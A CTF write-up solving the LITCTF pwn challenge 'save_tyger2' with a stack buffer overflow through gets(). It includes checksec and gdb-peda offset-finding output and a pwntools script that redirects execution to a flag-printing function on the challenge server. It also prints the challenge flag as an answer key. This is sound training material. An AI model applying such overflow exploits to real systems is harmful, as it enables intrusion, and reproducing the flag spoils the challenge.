# save_tyger2
![](https://img.shields.io/badge/category-pwn-blue)
![](https://img.shields.io/badge/solves-166-orange)

## Description
Tyger needs your help again.

Connect with `nc litctf.live 31788`

[save_tyger2.zip](https://drive.google.com/uc?export=download&id=1qCSTo01YjzrncT0SZGOTouC4egY_q-PX)

## Solution
In `save_tyger2.c`, we can see that there is a cell function that prints the flag. There is also a main function which uses the dangerous `gets` to read input into an array, and then return.

Due to the dangerous nature of `gets` (reading as many bytes as the user inputs), if stack protection is turned off and the address of cell is fixed (no PIE), then we can overwrite the saved return address of main so that when it returns, it returns to cell.
```
$ checksec save_tyger2
[*] '~/lit/save_tyger2/save_tyger2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Wonderful! No stack canary, and no PIE either. We can use gdb-peda to determine how much garbage to write before overwriting the return address.
```gdb
$ gdb save_tyger2
gdb-peda$ pattern create 80
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A'
gdb-peda$ r
Starting program: ~/lit/save_tyger2/save_tyger2
warning: Error disabling address space randomization: Operation not permitted
NOOOO, THEY TOOK HIM AGAIN!
Please help us get him out or there is no way we will be able to prepare LIT :sadness:
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A

Program received signal SIGSEGV, Segmentation fault.
```
Because we got a segfault, it means that we successfully overwrote the return address. The pattern string is important because it helps us figure out how many bytes to send before overwriting the return address.
```
gdb-peda$ pattern search
Registers contain pattern buffer:
RSI+-112 found at offset: 6610
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RSI] --> offset 1 - size ~81
[RSP] --> offset 40 - size ~40
[R8] --> offset 0 - size ~80
```
The pattern is reported at the top of the stack at offset 40, meaning that we should write 40 bytes of garbage, followed by the address of cell, to get the flag.
```py
from pwn import *

elf = ELF("./save_tyger2")

pay = b'A'*40 + p64(elf.symbols['cell'])

p = remote("litctf.live", 31788)
p.sendline(pay)

p.interactive()
```

Flag: `LITCTF{w3_w0nt_l3t_th3m_t4k3_tyg3r_3v3r_4gain}`
